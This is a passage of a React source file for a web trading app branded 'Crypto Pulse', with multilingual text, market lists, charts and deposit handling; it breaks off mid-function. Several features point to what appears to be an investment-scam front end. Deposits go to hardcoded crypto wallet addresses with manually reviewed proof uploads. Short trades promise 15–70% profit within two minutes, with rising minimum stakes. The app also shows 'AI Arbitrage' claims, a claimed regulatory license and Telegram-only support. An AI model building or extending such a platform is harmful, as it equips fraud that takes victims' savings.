import { 
  collection, 
  doc, 
  addDoc, 
  getDoc, 
  getDocs, 
  setDoc, 
  updateDoc, 
  onSnapshot, 
  query, 
  where 
} from 'firebase/firestore';
import React, { useState, useEffect, useRef } from 'react';
import './App.css';
import {
  Building2,
  ChevronDown,
  FileText,
  HelpCircle,
  ShieldCheck
} from 'lucide-react';
import { formatLibraryDoc, splitMarkdownSections } from './formatLibraryDoc';
import ArbitragePage from './ArbitragePage';
import WithdrawModal from './WithdrawModal';
import TradeResultModal from './TradeResultModal';
import { db } from './firebase';
// NOTE: lightweight-charts is ESM-only; avoid importing it in Jest.
// It is lazily loaded only when the chart component mounts in the browser.
let LightweightCharts = null;
const getLightweightCharts = async () => {
  if (LightweightCharts) return LightweightCharts;
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  LightweightCharts = await import('lightweight-charts');
  // Some bundlers expose the module as default
  return LightweightCharts?.default ?? LightweightCharts;
};

const TRANSLATIONS = {
  english: {
    crypto: 'Crypto',
    metals: 'Metals',
    forex: 'Forex',
    homeTitle: 'Markets',
    tradeHistory: 'Trade History',
    totalAssets: 'Total Assets (USDT)',
    login: 'Login',
    signUp: 'Sign Up',
    createAccount: 'Create Account',
    backToLogin: 'Back to Login',
    withdrawAssets: 'Withdraw Assets',
    verifySubmit: 'Verify & Submit',
    noTrades: 'No trades yet',
    loadingUserData: 'Loading user data...',
    loadingMarkets: 'Loading Markets...',
    trade: 'Trade',
    accountCenter: 'Account Center',
    buyCrypto: 'Buy Crypto',
    withdraw: 'Withdraw',
    customerService: 'Customer Service',
    manualDeposit: 'Deposit',
    langSelect: 'Language',
    selectLanguage: 'Select language',
    backHome: '← Home',
    depositTitle: 'Deposit',
    submissionReceived: 'Submission received. Our team is reviewing your transaction.',
    amount: 'Amount',
    uploadProof: 'Upload Proof',
    proofFile: 'Proof file selected',
    copy: 'Copy',
    copied: 'Copied!',
    submitDeposit: 'Submit Deposit Request',
    enterAmount: 'Enter a valid amount',
    submitError: 'Unable to submit request. Try again.',
    loginRequired: 'Please sign in to submit a deposit.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Settings',
    depositNotice: 'Use the address below and upload your proof for review.',
    uploadPlaceholder: 'No file chosen',
    ledgerTitle: 'Deposit Addresses',
    depositAsset: 'Asset',
    depositAddress: 'Address',
    languageOptions: 'Language options',
    openProfile: 'Profile',
    closeMenu: 'Close',
    theme: 'Theme',
    darkMode: 'Dark Mode',
    lightMode: 'Light Mode',
    appearance: 'Appearance',
    solid: 'Solid',
    gradient: 'Gradient'
  },
  french: {
    crypto: 'Crypto',
    metals: 'Métaux',
    forex: 'Forex',
    homeTitle: 'Marchés',
    tradeHistory: 'Historique des transactions',
    totalAssets: 'Actifs totaux (USDT)',
    login: 'Connexion',
    signUp: 'Inscription',
    createAccount: 'Créer un compte',
    backToLogin: 'Retour à la connexion',
    withdrawAssets: 'Retirer des actifs',
    verifySubmit: 'Vérifier et soumettre',
    noTrades: 'Aucune transaction pour le moment',
    loadingUserData: 'Chargement des données utilisateur...',
    loadingMarkets: 'Chargement des marchés...',
    trade: 'Trader',
    accountCenter: 'Espace Compte',
    buyCrypto: 'Acheter Crypto',
    withdraw: 'Retirer',
    customerService: 'Service Client',
    manualDeposit: 'Dépôt',
    langSelect: 'Langue',
    selectLanguage: 'Choisir la langue',
    backHome: '← Retour',
    depositTitle: 'Dépôt',
    submissionReceived: 'Soumission reçue. Notre équipe vérifie votre transaction.',
    amount: 'Montant',
    uploadProof: 'Joindre la preuve',
    proofFile: 'Fichier de preuve sélectionné',
    copy: 'Copier',
    copied: 'Copié !',
    submitDeposit: 'Soumettre la demande',
    enterAmount: 'Entrez un montant valide',
    submitError: 'Impossible de soumettre la demande. Réessayez.',
    loginRequired: 'Veuillez vous connecter pour soumettre un dépôt.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Paramètres',
    depositNotice: 'Utilisez l’adresse ci-dessous et téléchargez votre preuve pour examen.',
    uploadPlaceholder: 'Aucun fichier choisi',
    ledgerTitle: 'Adresses de dépôt',
    depositAsset: 'Actif',
    depositAddress: 'Adresse',
    languageOptions: 'Options de langue',
    openProfile: 'Profil',
    closeMenu: 'Fermer'
  },
  italian: {
    crypto: 'Crypto',
    metals: 'Metalli',
    forex: 'Forex',
    homeTitle: 'Mercati',
    tradeHistory: 'Storico operazioni',
    totalAssets: 'Patrimonio totale (USDT)',
    login: 'Accesso',
    signUp: 'Registrati',
    createAccount: 'Crea un account',
    backToLogin: 'Torna al login',
    withdrawAssets: 'Preleva fondi',
    verifySubmit: 'Verifica e invia',
    noTrades: 'Nessuna operazione ancora',
    loadingUserData: 'Caricamento dati utente...',
    loadingMarkets: 'Caricamento dei mercati...',
    trade: 'Scambia',
    accountCenter: 'Centro Account',
    buyCrypto: 'Compra Crypto',
    withdraw: 'Preleva',
    customerService: 'Assistenza',
    manualDeposit: 'Deposito',
    langSelect: 'Lingua',
    selectLanguage: 'Seleziona la lingua',
    backHome: '← Home',
    depositTitle: 'Deposito',
    submissionReceived: 'Invio ricevuto. Il nostro team sta esaminando la transazione.',
    amount: 'Importo',
    uploadProof: 'Carica Prova',
    proofFile: 'File prova selezionato',
    copy: 'Copia',
    copied: 'Copiato!',
    submitDeposit: 'Invia Richiesta',
    enterAmount: 'Inserisci un importo valido',
    submitError: 'Impossibile inviare la richiesta. Riprova.',
    loginRequired: 'Effettua l’accesso per inviare un deposito.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Impostazioni',
    depositNotice: 'Usa l’indirizzo qui sotto e carica la prova per la revisione.',
    uploadPlaceholder: 'Nessun file selezionato',
    ledgerTitle: 'Indirizzi di deposito',
    depositAsset: 'Asset',
    depositAddress: 'Indirizzo',
    languageOptions: 'Opzioni lingua',
    openProfile: 'Profilo',
    closeMenu: 'Chiudi'
  },
  spanish: {
    crypto: 'Cripto',
    metals: 'Metales',
    forex: 'Forex',
    homeTitle: 'Mercados',
    tradeHistory: 'Historial de operaciones',
    totalAssets: 'Activos totales (USDT)',
    login: 'Iniciar sesión',
    signUp: 'Registrarse',
    createAccount: 'Crear cuenta',
    backToLogin: 'Volver al inicio',
    withdrawAssets: 'Retirar fondos',
    verifySubmit: 'Verificar y enviar',
    noTrades: 'Aún no hay operaciones',
    loadingUserData: 'Cargando datos de usuario...',
    loadingMarkets: 'Cargando mercados...',
    trade: 'Operar',
    accountCenter: 'Centro de Cuenta',
    buyCrypto: 'Comprar Crypto',
    withdraw: 'Retirar',
    customerService: 'Atención',
    manualDeposit: 'Depósito',
    langSelect: 'Idioma',
    selectLanguage: 'Selecciona idioma',
    backHome: '← Inicio',
    depositTitle: 'Depósito',
    submissionReceived: 'Envío recibido. Nuestro equipo está revisando tu transacción.',
    amount: 'Cantidad',
    uploadProof: 'Subir prueba',
    proofFile: 'Archivo de prueba seleccionado',
    copy: 'Copiar',
    copied: '¡Copiado!',
    submitDeposit: 'Enviar Solicitud',
    enterAmount: 'Introduce una cantidad válida',
    submitError: 'No se puede enviar la solicitud. Inténtalo de nuevo.',
    loginRequired: 'Inicia sesión para enviar un depósito.',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: 'Ajustes',
    depositNotice: 'Usa la dirección abajo y sube tu prueba para revisión.',
    uploadPlaceholder: 'Ningún archivo seleccionado',
    ledgerTitle: 'Direcciones de depósito',
    depositAsset: 'Activo',
    depositAddress: 'Dirección',
    languageOptions: 'Opciones de idioma',
    openProfile: 'Perfil',
    closeMenu: 'Cerrar'
  },
  chinese: {
    crypto: '加密',
    metals: '贵金属',
    forex: '外汇',
    homeTitle: '市场',
    tradeHistory: '交易历史',
    totalAssets: '总资产 (USDT)',
    login: '登录',
    signUp: '注册',
    createAccount: '创建账户',
    backToLogin: '返回登录',
    withdrawAssets: '提现资产',
    verifySubmit: '验证并提交',
    noTrades: '暂无交易',
    loadingUserData: '正在加载用户数据...',
    loadingMarkets: '正在加载市场...',
    trade: '交易',
    accountCenter: '账户中心',
    buyCrypto: '购买加密',
    withdraw: '提现',
    customerService: '客服',
    manualDeposit: '存款',
    langSelect: '语言',
    selectLanguage: '选择语言',
    backHome: '← 首页',
    depositTitle: '存款',
    submissionReceived: '已收到提交。我们的团队正在审核您的交易。',
    amount: '金额',
    uploadProof: '上传凭证',
    proofFile: '已选择凭证文件',
    copy: '复制',
    copied: '已复制！',
    submitDeposit: '提交申请',
    enterAmount: '请输入有效金额',
    submitError: '无法提交请求。请重试。',
    loginRequired: '请登录以提交存款。',
    customerServiceLink: '@PrimeBlockLTS',
    settingsHeader: '设置',
    depositNotice: '使用下面地址并上传凭证以供审核。',
    uploadPlaceholder: '未选择文件',
    ledgerTitle: '存款地址',
    depositAsset: '资产',
    depositAddress: '地址',
    languageOptions: '语言选项',
    openProfile: '个人资料',
    closeMenu: '关闭'
  }
};

const LIBRARY_FILES = {
  'company-profile': 'about-us',
  'white-paper': 'white-paper',
  'regulatory-license': 'regulatory-license',
  faq: 'commom-problem'
};


const LIBRARY_LABELS = {
  'company-profile': 'Company Profile',
  'white-paper': 'White Paper',
  'regulatory-license': 'Regulatory License',
  faq: 'FAQ'
};

const FAQ_STATIC_ENTRIES = [
  {
    id: 'what-pulse',
    question: 'What can I do at Crypto Pulse?',
    bodyText:
      'Crypto Pulse brings live pricing for crypto, metals, and forex into one workspace. Review markets, open trades when you are ready, manage deposits and withdrawals, and reach customer service without leaving the app.'
  },
  {
    id: 'what-ai-arb',
    question: 'What is AI Arbitrage?',
    bodyText:
      'AI Arbitrage describes automated or assisted strategies that aim to capture price differences across venues or related instruments. Execution risk, fees, latency, and liquidity can eliminate theoretical edges. This explanation is educational only—not trading advice.'
  }
];

const CREDIT_SCORE_ROWS = [
  { range: '580 – 620', tier: 'Developing', notes: 'Elevated risk profile; enhanced verification may apply.' },
  { range: '621 – 650', tier: 'Fair', notes: 'Moderate standing; standard limits and monitoring.' },
  { range: '651 – 700', tier: 'Good', notes: 'Stable profile; expanded access where eligible.' },
  { range: '701 – 750', tier: 'Very Good', notes: 'Strong standing; preferential review timelines.' },
  { range: '751 – 850', tier: 'Excellent', notes: 'Top tier; maximum program flexibility offered.' }
];

function CreditScoreTiersTable() {
  return (
    <div className="credit-tier-table-wrap">
      <table className="credit-tier-table">
        <thead>
          <tr>
            <th>Score range</th>
            <th>Tier</th>
            <th>Program notes</th>
          </tr>
        </thead>
        <tbody>
          {CREDIT_SCORE_ROWS.map((row) => (
            <tr key={row.range}>
              <td>{row.range}</td>
              <td>{row.tier}</td>
              <td>{row.notes}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function RegulatoryDocLayout({ bodyText }) {
  const sections = splitMarkdownSections(bodyText);
  if (!sections.length) {
    return <div className="library-formatted-body">{formatLibraryDoc(bodyText)}</div>;
  }
  const tones = ['regulatory-panel--slate', 'regulatory-panel--indigo', 'regulatory-panel--teal'];
  return (
    <div className="regulatory-doc-layout">
      {sections.map((sec, i) => (
        <section key={`${sec.title}-${i}`} className={`regulatory-panel ${tones[i % tones.length]}`}>
          <h2 className="library-section-title regulatory-panel-heading">{sec.title}</h2>
          <div className="regulatory-panel-inner library-formatted-body">{formatLibraryDoc(sec.body)}</div>
        </section>
      ))}
    </div>
  );
}

function DocFaqAccordion({ entries, openIndex, setOpenIndex }) {
  return (
    <div className="faq-accordion-root">
      {entries.map((entry, idx) => {
        const isOpen = openIndex === idx;
        return (
          <div key={entry.id} className={`faq-acc-item ${isOpen ? 'is-open' : ''}`}>
            <button
              type="button"
              className="faq-acc-trigger"
              aria-expanded={isOpen}
              onClick={() => setOpenIndex(isOpen ? null : idx)}
            >
              <span className="faq-acc-question">{entry.question}</span>
              <ChevronDown className="faq-acc-chevron" size={20} strokeWidth={2} aria-hidden />
            </button>
            <div className={`faq-acc-panel ${isOpen ? 'faq-acc-panel--open' : ''}`}>
              <div className="faq-acc-panel-inner">
                {entry.table ? (
                  <CreditScoreTiersTable />
                ) : (
                  <div className="library-formatted-body faq-acc-formatted">{formatLibraryDoc(entry.bodyText)}</div>
                )}
              </div>
            </div>
          </div>
        );
      })}
    </div>
  );
}

function DocFaqView({ rawText, openIndex, setOpenIndex }) {
  const parsed = splitMarkdownSections(rawText);
  const entries = [
    ...FAQ_STATIC_ENTRIES.map((e) => ({
      id: e.id,
      question: e.question,
      bodyText: e.bodyText,
      table: false
    })),
    ...parsed.map((s, i) => ({
      id: `commom-${i}`,
      question: s.title,
      bodyText: s.body,
      table: false
    })),
    {
      id: 'credit-score-tiers',
      question: 'What are the credit score tiers?',
      bodyText: '',
      table: true
    }
  ];
  return <DocFaqAccordion entries={entries} openIndex={openIndex} setOpenIndex={setOpenIndex} />;
}

function AppInner() {
  const [activeId, setActiveId] = useState(() => localStorage.getItem('active_user_id') || null);
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('is_logged_in') === 'true');

  // --- DATA PERSISTENCE (Firebase Firestore) ---
  const [allUsers, setAllUsers] = useState({});
  const [isLoadingUsers, setIsLoadingUsers] = useState(true);


  // --- STATE MANAGEMENT ---
  const [coins, setCoins] = useState([
    { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', current_price: 81118.60, image: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png', sparkline_in_7d: { price: [81118.60] } },
    { id: 'ethereum', name: 'Ethereum', symbol: 'ETH', current_price: 2100, image: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png', sparkline_in_7d: { price: [2100] } },
    { id: 'solana', name: 'Solana', symbol: 'SOL', current_price: 165, image: 'https://assets.coingecko.com/coins/images/4128/large/solana.png', sparkline_in_7d: { price: [165] } },
    { id: 'binancecoin', name: 'Binance Coin', symbol: 'BNB', current_price: 320, image: 'https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png', sparkline_in_7d: { price: [320] } },
    { id: 'ripple', name: 'XRP', symbol: 'XRP', current_price: 0.65, image: 'https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png', sparkline_in_7d: { price: [0.65] } },
    { id: 'cardano', name: 'Cardano', symbol: 'ADA', current_price: 0.42, image: 'https://assets.coingecko.com/coins/images/975/large/cardano.png', sparkline_in_7d: { price: [0.42] } },
    { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', current_price: 7.8, image: 'https://assets.coingecko.com/coins/images/12171/large/polkadot.png', sparkline_in_7d: { price: [7.8] } },
    { id: 'chainlink', name: 'Chainlink', symbol: 'LINK', current_price: 18.1, image: 'https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png', sparkline_in_7d: { price: [18.1] } },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', current_price: 0.92, image: 'https://assets.coingecko.com/coins/images/4713/large/polygon-logo.png', sparkline_in_7d: { price: [0.92] } },
    { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', current_price: 84.5, image: 'https://assets.coingecko.com/coins/images/2/large/litecoin.png', sparkline_in_7d: { price: [84.5] } },
    { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', current_price: 0.07, image: 'https://assets.coingecko.com/coins/images/5/large/dogecoin.png', sparkline_in_7d: { price: [0.07] } },
    { id: 'shiba-inu', name: 'Shiba Inu', symbol: 'SHIB', current_price: 0.000007, image: 'https://assets.coingecko.com/coins/images/11939/large/shiba.png', sparkline_in_7d: { price: [0.000007] } }
  ]);
  const [loading, setLoading] = useState(true);
  const [marketStatus, setMarketStatus] = useState('live');
  const [priceFlash, setPriceFlash] = useState({});
  const [currentPage, setCurrentPage] = useState('home'); 
  const [marketTab, setMarketTab] = useState('metals'); 
  const [language, setLanguage] = useState(() => localStorage.getItem('app_language') || 'english');
  const [theme, setTheme] = useState(() => localStorage.getItem('app_theme') || 'dark');
  const [appearance, setAppearance] = useState(() => localStorage.getItem('app_appearance') || 'solid');
  const [copyStatus, setCopyStatus] = useState({});
  const [depositAmount, setDepositAmount] = useState('');
  const [selectedCurrency, setSelectedCurrency] = useState('BTC');
  const [proofFile, setProofFile] = useState(null);
  const [depositSubmitted, setDepositSubmitted] = useState(false);

  const [showAuth, setShowAuth] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [authData, setAuthData] = useState({ email: '', password: '', name: '', pin: '' });

  const [showWithdraw, setShowWithdraw] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawPin, setWithdrawPin] = useState('');

  const pollIntervalRef = useRef(null);
  const chartPollIntervalRef = useRef(null);
  const [showProfileWithdraw, setShowProfileWithdraw] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [faqOpenIndex, setFaqOpenIndex] = useState(null);
  const [libraryDocKey, setLibraryDocKey] = useState(null);
  const [libraryBody, setLibraryBody] = useState('');
  const [libraryLoading, setLibraryLoading] = useState(false);
  const [libraryError, setLibraryError] = useState(null);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [verificationStep, setVerificationStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verificationCode, setVerificationCode] = useState('');

  const [clickCount, setClickCount] = useState(0);
  const [targetUserId, setTargetUserId] = useState('');
  const [adminStatus, setAdminStatus] = useState('');

  const [selectedCoin, setSelectedCoin] = useState(() => {
    // Auto-select gold on startup
    const goldMarket = [
      { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 4717.58, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [4717.58] } },
      { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 77.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [77.15] } },
      { id: 'platinum', name: 'Platinum', symbol: 'XPT', current_price: 950.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [950] } },
      { id: 'palladium', name: 'Palladium', symbol: 'XPD', current_price: 1200.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [1200] } }
    ].find(market => market.id === 'gold');
    return goldMarket;
  });
  const [tradeConfig, setTradeConfig] = useState({ time: 30, amount: 10, type: 'Long' });
  const [isTrading, setIsTrading] = useState(false);
  const [countdown, setCountdown] = useState(0); 
  const [tradeResult, setTradeResult] = useState(null);
  const [showResultModal, setShowResultModal] = useState(false);
  const [ohlcData, setOhlcData] = useState([]);
  const [coinStats, setCoinStats] = useState(null);
  const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString());
  const [tradeHistory, setTradeHistory] = useState([]);
  const [chartTimeframe, setChartTimeframe] = useState('1M');

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date().toLocaleTimeString());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!libraryDocKey) {
      setLibraryBody('');
      setLibraryError(null);
      setLibraryLoading(false);
      return;
    }
    const filename = LIBRARY_FILES[libraryDocKey];
    if (!filename) return;
    let cancelled = false;
    setLibraryLoading(true);
    setLibraryError(null);

    const safeName = filename.toLowerCase().replace(/\s+/g, '-');
    fetch(`/content/${safeName}.txt`)
      .then((res) => {

        if (!res.ok) throw new Error('Could not load this article.');
        return res.text();
      })
      .then((text) => {
        if (!cancelled) setLibraryBody(text);
      })
      .catch((err) => {
        if (!cancelled) setLibraryError(err.message || 'Load failed.');
      })
      .finally(() => {
        if (!cancelled) setLibraryLoading(false);
      });
    return () => {
      cancelled = true;
    };
  }, [libraryDocKey]);

  useEffect(() => {
    setFaqOpenIndex(null);
  }, [libraryDocKey]);

  useEffect(() => {
    if (!drawerOpen) return;
    const onEsc = (e) => {
      if (e.key === 'Escape') setDrawerOpen(false);
    };
    document.addEventListener('keydown', onEsc);
    return () => document.removeEventListener('keydown', onEsc);
  }, [drawerOpen]);

  const openLibraryDoc = (key) => {
    setLibraryDocKey(key);
    setCurrentPage('home');
    setDrawerOpen(false);
  };

  // Trade configuration object
  const tradeOptions = {
    30: { profit: 0.15, minAmount: 500 },
    60: { profit: 0.30, minAmount: 3000 },
    90: { profit: 0.50, minAmount: 10000 },
    120: { profit: 0.70, minAmount: 100000 }
  };

  const flashPriceChange = (id, oldPrice, newPrice) => {
    if (typeof oldPrice !== 'number' || oldPrice === newPrice) return;
    const direction = newPrice > oldPrice ? 'up' : 'down';
    setPriceFlash(prev => ({ ...prev, [id]: direction }));
    setTimeout(() => {
      setPriceFlash(prev => {
        const { [id]: removed, ...rest } = prev;
        return rest;
      });
    }, 900);
  };

  const calculateRSI = (prices, period = 14) => {
    if (prices.length < period) return 50;

    let gains = 0;
    let losses = 0;
    for (let i = 1; i < period; i++) {
      const diff = prices[i] - prices[i - 1];
      if (diff > 0) gains += diff;
      else losses -= diff;
    }

    const avgGain = gains / period;
    const avgLoss = losses / period;
    if (avgLoss === 0) return 100;
    const rs = avgGain / avgLoss;
    return (100 - (100 / (1 + rs))).toFixed(2);
  };

  const InteractiveChart = ({ data, timeframe, onTimeframeChange, selectedCoin }) => {
    const chartContainerRef = useRef(null);
    const chartRef = useRef(null);
    const seriesRef = useRef(null);
    const [hoveredPrice, setHoveredPrice] = useState(null);
    const [hoveredTime, setHoveredTime] = useState(null);

    useEffect(() => {
      if (!chartContainerRef.current || !data || data.length === 0) return;

      try {
        // Clear previous chart
        if (chartContainerRef.current.firstChild) {
          chartContainerRef.current.innerHTML = '';
        }

        // Create chart with professional styling and no watermark
        const chart = LightweightCharts.createChart(chartContainerRef.current, {
          layout: {
            background: { color: '#ffffff' },
            textColor: '#333333',
            fontSize: 12,
            fontFamily: 'Inter, sans-serif'
          },
          width: chartContainerRef.current.clientWidth,
          height: window.innerWidth < 768 ? 300 : 400,
          timeScale: {
            timeVisible: true,
            secondsVisible: false,
            barSpacing: 8,
            rightOffset: 10
          },
          rightPriceScale: {
            borderColor: '#d3d3d3',
            textColor: '#666666',
            scaleMargins: { top: 0.1, bottom: 0.2 }
          },
          grid: {
            horzLines: { color: '#e0e0e0', style: 1 },
            vertLines: { color: '#e0e0e0', style: 1 }
          },
          handleScale: { mouseWheel: true, pinch: true },
          handleScroll: { mouseWheel: true, horzTouchDrag: true, vertTouchDrag: true },
          watermark: { visible: false },
          logo: { visible: false }
        });

        // Add candlestick series using new API
        const candlestickSeries = chart.addSeries(LightweightCharts.CandlestickSeries, {
          upColor: '#26a69a',
          downColor: '#ef5350',
          borderUpColor: '#26a69a',
          borderDownColor: '#ef5350',
          wickUpColor: '#26a69a',
          wickDownColor: '#ef5350',
          title: selectedCoin.symbol.toUpperCase()
        });

        // Transform data for lightweight-charts
        const chartData = data.map((candle, idx) => ({
          time: Math.floor(Date.now() / 1000) - (data.length - idx - 1) * 86400,
          open: candle.open,
          high: candle.high,
          low: candle.low,
          close: candle.close
        }));

        candlestickSeries.setData(chartData);

        // Add price line for current price
        candlestickSeries.createPriceLine({
          price: selectedCoin.current_price,
          color: '#f0b90b',
          lineWidth: 2,
          lineStyle: 1,
          axisLabelVisible: true,
          title: selectedCoin.symbol.toUpperCase()
        });

        // Fit content
        chart.timeScale().fitContent();

        chartRef.current = chart;
        seriesRef.current = candlestickSeries;

        // Crosshair listener for hovering
        const handleCrosshairMove = (param) => {
          if (param.point === undefined || !param.seriesPrices || !candlestickSeries) {
            setHoveredPrice(null);
            setHoveredTime(null);
            return;
          }

          try {
            const dataPoint = param.seriesPrices.get(candlestickSeries);
            if (dataPoint) {
              setHoveredPrice(dataPoint.close);
              const time = new Date(param.time * 1000);
              setHoveredTime(time.toLocaleDateString() + ' ' + time.toLocaleTimeString());
            } else {
              setHoveredPrice(null);
              setHoveredTime(null);
            }
          } catch (error) {
            console.warn('Crosshair move error:', error);
            setHoveredPrice(null);
            setHoveredTime(null);
          }
        };

        chart.subscribeCrosshairMove(handleCrosshairMove);

        // Handle window resize
        const handleResize = () => {
          if (chartContainerRef.current && chart) {
            const width = chartContainerRef.current.clientWidth;
            const height = window.innerWidth < 768 ? 300 : 400;
            chart.applyOptions({ width, height });
            setTimeout(() => chart.timeScale().fitContent(), 0);
          }
        };

        window.addEventListener('resize', handleResize);

        return () => {
          window.removeEventListener('resize', handleResize);
          chart.unsubscribeCrosshairMove(handleCrosshairMove);
        };
      } catch (error) {
        console.error('Chart initialization error:', error);
      }
    }, [data, selectedCoin]);

    // Update chart when current price changes (live sync)
    useEffect(() => {
      if (seriesRef.current && selectedCoin && data && data.length > 0) {
        try {
          const lastCandle = {
            time: Math.floor(Date.now() / 1000),
            open: data[data.length - 1].open,
            high: Math.max(data[data.length - 1].high, selectedCoin.current_price),
            low: Math.min(data[data.length - 1].low, selectedCoin.current_price),
            close: selectedCoin.current_price
          };
          seriesRef.current.update(lastCandle);
        } catch (error) {
          console.error('Price update error:', error);
        }
      }
      // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [selectedCoin.current_price]);

    const timeframes = ['1D', '5D', '1M', '3M', '6M', 'YTD', '1Y', 'ALL'];

    return (
      <div className="interactive-chart-wrapper">
        <div className="chart-timeframe-toolbar">
          {timeframes.map((tf) => (
            <button
              key={tf}
              className={`timeframe-btn ${timeframe === tf ? 'active' : ''}`}
              onClick={() => onTimeframeChange(tf)}
            >
              {tf}
            </button>
          ))}
        </div>
        <div className="chart-info-bar">
          {hoveredTime && hoveredPrice && (
            <div className="chart-crosshair-info">
              <span className="crosshair-time">{hoveredTime}</span>
              <span className="crosshair-price">${hoveredPrice.toFixed(2)}</span>
            </div>
          )}
        </div>
        <div
          ref={chartContainerRef}
          className="interactive-chart-container"
          style={{
            width: '100%',
            minHeight: window.innerWidth < 768 ? '300px' : '400px',
            background: '#ffffff',
            borderRadius: '8px'
          }}
        ></div>
        <div className="chart-legend">
          <div className="legend-item">
            <span className="legend-color" style={{ background: '#26a69a' }}></span>
            <span>Up</span>
          </div>
          <div className="legend-item">
            <span className="legend-color" style={{ background: '#ef5350' }}></span>
            <span>Down</span>
          </div>
          <div className="legend-item">
            <span className="legend-color" style={{ background: '#f0b90b' }}></span>
            <span>Current Price</span>
          </div>
        </div>
      </div>
    );
  };

  const telegramLink = "https://t.me/PrimeBlockLTS";

  const [globalMarkets, setGlobalMarkets] = useState([
    { id: 'gold', name: 'Gold', symbol: 'XAU', current_price: 4717.58, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [4717.58] } },
    { id: 'silver', name: 'Silver', symbol: 'XAG', current_price: 77.15, image: 'https://cdn-icons-png.flaticon.com/512/5833/5833860.png', sparkline_in_7d: { price: [77.15] } },
    { id: 'platinum', name: 'Platinum', symbol: 'XPT', current_price: 950.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [950] } },
    { id: 'palladium', name: 'Palladium', symbol: 'XPD', current_price: 1200.00, image: 'https://cdn-icons-png.flaticon.com/512/272/272530.png', sparkline_in_7d: { price: [1200] } }
  ]);

  const [forexMarkets, setForexMarkets] = useState([
    { id: 'eurusd', name: 'EUR/USD', symbol: 'EURUSD', current_price: 1.1747, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'gbpusd', name: 'GBP/USD', symbol: 'GBPUSD', current_price: 1.2712, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' },
    { id: 'usdjpy', name: 'USD/JPY', symbol: 'USDJPY', current_price: 155.12, image: 'https://cdn-icons-png.flaticon.com/512/197/197604.png' },
    { id: 'audusd', name: 'AUD/USD', symbol: 'AUDUSD', current_price: 0.6523, image: 'https://cdn-icons-png.flaticon.com/512/197/197507.png' },
    { id: 'usdchf', name: 'USD/CHF', symbol: 'USDCHF', current_price: 0.9056, image: 'https://cdn-icons-png.flaticon.com/512/197/197540.png' },
    { id: 'nzdusd', name: 'NZD/USD', symbol: 'NZDUSD', current_price: 0.5987, image: 'https://cdn-icons-png.flaticon.com/512/197/197589.png' },
    { id: 'usdcad', name: 'USD/CAD', symbol: 'USDCAD', current_price: 1.3456, image: 'https://cdn-icons-png.flaticon.com/512/197/197430.png' },
    { id: 'eurgbp', name: 'EUR/GBP', symbol: 'EURGBP', current_price: 0.8512, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'eurjpy', name: 'EUR/JPY', symbol: 'EURJPY', current_price: 167.89, image: 'https://cdn-icons-png.flaticon.com/512/197/197615.png' },
    { id: 'gbpjpy', name: 'GBP/JPY', symbol: 'GBPJPY', current_price: 197.45, image: 'https://cdn-icons-png.flaticon.com/512/197/197374.png' }
  ]);

  const depositAssets = [
    { name: 'BTC', address: 'bc1qtaevclzdtlv5xz46dr5se6l5vwqdts8fcmt8xz' },
    { name: 'ETH', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
    { name: 'SOL', address: '9N7ccQuH7HZZGq3YT4psoMhQ22ue2HuZg2PF94m7FnAy' },
    { name: 'USDT (ERC20/BEP20)', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' },
    { name: 'USDC', address: '0x0023afc77d8f033ddc4b7a984a0506231e4dea6a' }
  ];

  const t = (key) => {
    return TRANSLATIONS[language] && TRANSLATIONS[language][key] ? TRANSLATIONS[language][key] : TRANSLATIONS.english[key] || key;
  };

  const availableMarkets = () => {
    if (marketTab === 'metals') return globalMarkets;
    if (marketTab === 'forex') return forexMarkets;
    return coins;
  };

  const handleCopy = async (address) => {
    try {
      await navigator.clipboard.writeText(address);
      setCopyStatus(prev => ({ ...prev, [address]: t('copied') }));
      setTimeout(() => setCopyStatus(prev => ({ ...prev, [address]: '' })), 1800);
    } catch (error) {
      console.error('Clipboard copy failed', error);
    }
  };

  const handleDepositSubmit = async (event) => {
    event.preventDefault();
    if (!depositAmount || Number(depositAmount) <= 0) {
